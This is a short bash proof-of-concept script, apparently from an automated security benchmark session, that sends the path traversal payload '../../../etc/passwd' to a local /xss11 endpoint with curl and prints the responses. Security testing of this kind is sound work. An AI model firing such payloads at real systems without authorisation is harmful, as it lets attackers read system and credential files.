#!/bin/bash
# POC: Investigates actual HTTP response to understand how the endpoint handles path traversal payloads
# Target: ./repo
# Created: 2025-11-05T17:19:34.148Z
# Session: benchmark-XBEN-012-24-mhm7ivyh

# Path Traversal Investigation POC
# Examine actual HTTP responses and payload filtering behavior

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/xss11"

echo "=========================================="
echo "Path Traversal Investigation"
echo "Target: ${TARGET_URL}${ENDPOINT}"
echo "=========================================="
echo

# Test a simple path traversal payload
PAYLOAD="../../../etc/passwd"
ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | jq -sRr @uri)

echo "Testing payload: $PAYLOAD"
echo "URL-encoded: $ENCODED_PAYLOAD"
echo
echo "Raw HTTP response:"
echo "---"
curl -v "${TARGET_URL}${ENDPOINT}?name=${ENCODED_PAYLOAD}" 2>&1
echo "---"
echo
echo "Response body only:"
echo "---"
curl -s "${TARGET_URL}${ENDPOINT}?name=${ENCODED_PAYLOAD}" 2>&1
echo "---"